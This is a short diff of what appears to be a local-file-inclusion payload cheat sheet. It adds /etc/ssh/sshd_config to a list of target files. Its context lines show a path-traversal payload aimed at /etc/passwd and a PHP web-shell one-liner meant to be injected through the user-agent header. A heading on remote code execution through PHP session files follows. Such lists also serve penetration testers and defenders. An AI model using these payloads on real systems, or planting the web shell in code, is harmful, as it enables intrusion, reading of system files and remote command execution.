@@ -72,6 +72,10 @@ language=../../../../../../../../etc/passwd%00
 <?php system($_GET['cmd']); ?> # use as an user-agent
 ```
 
+```
+/etc/ssh/sshd_config
+```
+
 # RCE through php session files
 
 ```
